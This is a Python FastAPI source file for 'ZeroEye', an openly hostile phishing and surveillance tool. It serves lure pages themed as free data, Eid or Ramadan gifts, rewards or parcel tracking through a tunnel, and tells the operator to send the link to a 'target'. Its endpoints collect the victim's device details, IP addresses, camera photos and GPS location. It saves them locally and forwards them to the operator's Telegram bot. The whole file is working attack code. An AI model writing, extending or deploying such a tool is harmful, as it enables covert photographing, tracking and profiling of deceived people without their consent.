import os
import sys
import json
import time
import shutil
import atexit
from fastapi import FastAPI, UploadFile, File, Form
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
import uvicorn
from rich.console import Console
from rich.prompt import Prompt, Confirm
from rich.panel import Panel

from core.banner import get_banner
from core.bot import TelegramSender
from core.tunnel import TunnelManager

console = Console()
app = FastAPI(docs_url=None, redoc_url=None)
app.add_middleware(
    CORSMiddleware, 
    allow_origins=["*"], 
    allow_methods=["*"], 
    allow_headers=["*"]
)

# Ensure directories exist
if not os.path.exists("static"): os.makedirs("static")
if not os.path.exists("captured"): os.makedirs("captured")
if not os.path.exists("templates"): os.makedirs("templates")

app.mount("/static", StaticFiles(directory="static"), name="static")

CONFIG_FILE = "config.json"
CONFIG = {
    "telegram_enabled": False, 
    "bot_token": "", 
    "chat_id": "", 
    "template": "free_data"
}
bot = None
tunnel_manager = None

def load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
        except:
            return None
    return None

def save_config(conf):
    try:
        with open(CONFIG_FILE, 'w') as f:
            json.dump(conf, f, indent=2)
        return True
    except:
        return False

def delete_config():
    try:
        if os.path.exists(CONFIG_FILE):
            os.remove(CONFIG_FILE)
            return True
    except:
        pass
    return False

def save_local(filename, data):
    try:
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        with open(f"captured/{filename}", "a", encoding='utf-8') as f:
            f.write(f"\n{'='*60}\n")
            f.write(f"Timestamp: {timestamp}\n")
            f.write(f"{'='*60}\n")
            f.write(f"{data}\n\n")
    except:
        pass

def cleanup():
    global tunnel_manager
    if tunnel_manager:
        tunnel_manager.stop_tunnel()

atexit.register(cleanup)

# FastAPI Routes
@app.get("/")
async def serve_index():
    path = f"templates/{CONFIG['template']}.html"
    if os.path.exists(path):
        with open(path, "r", encoding="utf-8") as f: 
            return HTMLResponse(f.read())
    return HTMLResponse("<h1>Template not found</h1>")

@app.post("/upload_sys")
async def receive_sys(data: str = Form(...)):
    try:
        info = json.loads(data)
        
        basic_info = info.get('basic', {})
        platform = basic_info.get('platform', 'Unknown')
        screen = basic_info.get('screen', {})
        screen_res = f"{screen.get('width', '?')}x{screen.get('height', '?')}"
        timezone = basic_info.get('timezone', {}).get('name', 'Unknown')
        
        console.print(Panel(
            f"[bold green]🎯 VICTIM CONNECTED[/bold green]\n\n"
            f"[cyan]Device:[/cyan] {platform}\n"
            f"[cyan]Screen:[/cyan] {screen_res}\n"
            f"[cyan]Timezone:[/cyan] {timezone}\n"
            f"[cyan]Template:[/cyan] {CONFIG['template']}",
            title="System Intelligence",
            border_style="green"
        ))
        
        if bot:
            telegram_msg = f"🎯 *NEW VICTIM - {CONFIG['template'].upper()}*\n\n"
            telegram_msg += f"*Device:* {platform}\n"
            telegram_msg += f"*Screen:* {screen_res}\n"
            telegram_msg += f"*Timezone:* {timezone}\n"
            bot.send_message(telegram_msg)
        
        save_local("victims.txt", json.dumps(info, indent=2))
        return {"status": "ok"}
        
    except:
        return {"status": "error"}

@app.post("/upload_ip")
async def receive_ip(data: str = Form(...)):
    try:
        info = json.loads(data)
        ips = info.get('ips', [])
        
        for ip in ips:
            console.print(f"[green][+] IP Captured: {ip}[/green]")
            
            if bot: 
                bot.send_message(f"🌐 *IP Address*\n\n`{ip}`")
            
            save_local("ip_logs.txt", f"IP: {ip}")
        
        return {"status": "ok"}
        
    except:
        return {"status": "error"}

@app.post("/upload_cam")
async def receive_cam(file: UploadFile = File(...)):
    try:
        filename = f"captured/cam_{int(time.time())}.jpg"
        with open(filename, "wb") as buffer: 
            shutil.copyfileobj(file.file, buffer)
        
        console.print(f"[green][+] Photo captured[/green]")
        
        if bot: 
            bot.send_photo(filename, caption="📸 Camera Capture")
            
        return {"status": "ok"}
        
    except:
        return {"status": "error"}

@app.post("/upload_location")
async def receive_location(data: str = Form(...)):
    try:
        info = json.loads(data)
        
        if 'latitude' in info:
            console.print(Panel(
                f"[bold yellow]📍 LOCATION DATA[/bold yellow]\n\n"
                f"[cyan]Latitude:[/cyan] {info['latitude']}\n"
                f"[cyan]Longitude:[/cyan] {info['longitude']}",
                title="Geolocation",
                border_style="yellow"
            ))
            
            if bot:
                bot.send_message(f"📍 *Location*\n\nLat: {info['latitude']}\nLon: {info['longitude']}")
        
        save_local("location.txt", json.dumps(info, indent=2))
        return {"status": "ok"}
        
    except:
        return {"status": "error"}

def start_wizard():
    console.clear()
    console.print(get_banner())
    
    # Config persistence
    saved_conf = load_config()
    global bot, CONFIG, tunnel_manager
    
    if saved_conf:
        console.print("\n[cyan]📁 Found saved configuration[/cyan]")
        
        choice = Prompt.ask(
            "Use saved settings?", 
            choices=["y", "n", "delete"], 
            default="y"
        )
        
        if choice == "y":
            CONFIG.update(saved_conf)
            if CONFIG["telegram_enabled"] and CONFIG["bot_token"] and CONFIG["chat_id"]:
                bot = TelegramSender(CONFIG["bot_token"], CONFIG["chat_id"])
        elif choice == "delete":
            delete_config()
            saved_conf = None
        else:
            saved_conf = None

    if not saved_conf:
        console.print("\n[bold yellow]🤖 Telegram Configuration[/bold yellow]")
        if Confirm.ask("Enable Telegram notifications?", default=True):
            CONFIG["telegram_enabled"] = True
            CONFIG["bot_token"] = Prompt.ask("Enter Bot Token")
            CONFIG["chat_id"] = Prompt.ask("Enter Chat ID")
            
            test_bot = TelegramSender(CONFIG["bot_token"], CONFIG["chat_id"])
            if Confirm.ask("Save these settings?", default=True):
                save_config(CONFIG)
            
            bot = test_bot
        else:
            CONFIG["telegram_enabled"] = False

    # Template selection
    console.print("\n[bold cyan]🎨 Select Template[/bold cyan]")
    templates = {
        "1": ("🎁 Free Data", "free_data"),
        "2": ("🌙 Eid Gift", "eid"), 
        "3": ("🕌 Ramadan", "ramadan"),
        "4": ("🌍 Gulf Bundle", "gulf"),
        "5": ("🎁 Rewards", "rewards"),
        "6": ("📦 Tracking", "tracking")
    }
    
    for key, (name, _) in templates.items():
        console.print(f"  {key}. {name}")
    
    choice = Prompt.ask("Choose template", choices=list(templates.keys()), default="1")
    CONFIG["template"] = templates[choice][1]
    console.print(f"[green][✓] Selected: {templates[choice][0]}[/green]")

    # Start server and tunnel
    port = 8080
    console.print(f"\n[green][*] Starting server on port {port}...[/green]")
    
    # Initialize tunnel manager
    tunnel_manager = TunnelManager(port)
    
    console.print("[cyan][*] Establishing secure tunnel...[/cyan]")
    url = tunnel_manager.start_tunnel()
    
    console.print(Panel(
        f"[bold cyan]🚀 ZEROEYE READY[/bold cyan]\n\n"
        f"[bold green]{url}[/bold green]\n\n"
        f"[yellow]📋 Send this link to your target[/yellow]\n"
        f"[green]✅ All systems operational[/green]\n"
        f"[grey50]💡 Data will be saved to captured/ folder[/grey50]",
        title="ZeroEye v2.0 - Professional",
        border_style="green",
        expand=False
    ))
    
    console.print("\n[cyan]🛡️  Waiting for targets... (Ctrl+C to stop)[/cyan]")
    
    try:
        uvicorn.run(app, host="0.0.0.0", port=port, log_level="error")
    except KeyboardInterrupt:
        console.print("\n[yellow][!] Shutting down...[/yellow]")
    except Exception as e:
        console.print(f"[red][!] Server error: {e}[/red]")
    finally:
        cleanup()

if __name__ == "__main__":
    start_wizard()
